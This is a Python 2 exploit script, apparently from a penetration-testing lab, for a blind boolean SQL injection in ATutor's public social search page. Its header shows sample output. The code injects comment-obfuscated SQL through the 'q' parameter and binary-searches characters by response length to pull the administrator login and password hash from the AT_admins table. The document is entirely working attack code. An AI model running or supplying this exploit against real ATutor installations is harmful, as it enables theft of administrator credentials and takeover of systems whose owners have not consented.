# python atutor_gethash.py atutor
# (+) Retrieving username....
# (+) Retrieving username length....
# length: 7
# teacher
# (+) done!
# (+) Retrieving password hash....
# (+) Retrieving password hash length....
# length: 40
# 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e
# (+) done!

import requests
import sys

def searchFriends_sqli(ip, inj_str):
    lo = 32
    hi = 127
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        # now we update the sqli
        # (ascii(substring((select/**/user()),?,1)))>str(mid) 
        # The key is to check if the item you are looking for is larger than the item you are currently scanning.
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(mid)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo    

def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target>"  % sys.argv[0]
        print '(+) eg: %s 192.168.121.103'  % sys.argv[0]
        sys.exit(-1)

    ip = sys.argv[1]

    print "(+) Retrieving username...."
    
    print "(+) Retrieving username length...."
    length = 0
    for i in range(1, 21):
        injection_string = "test')/**/or/**/(select/**/length((select/**/login/**/from/**/AT_admins)))="+ str(i) + "%23" 
        #print injection_string
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            length = i
            print "length:", i
            break
    for i in range(1, length+1):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/login/**/from/**/AT_admins),%d,1)))>[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print "\n(+) done!"

    print "(+) Retrieving password hash...."
    
    print "(+) Retrieving password hash length...."
    length = 0
    for i in range(1, 50):
        injection_string = "test')/**/or/**/(select/**/length((select/**/password/**/from/**/AT_admins)))="+ str(i) + "%23" 
        #print injection_string
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            length = i
            print "length:", i
            break
    for i in range(1, length+1):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/password/**/from/**/AT_admins),%d,1)))>[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print "\n(+) done!"

if __name__ == "__main__":
    main()
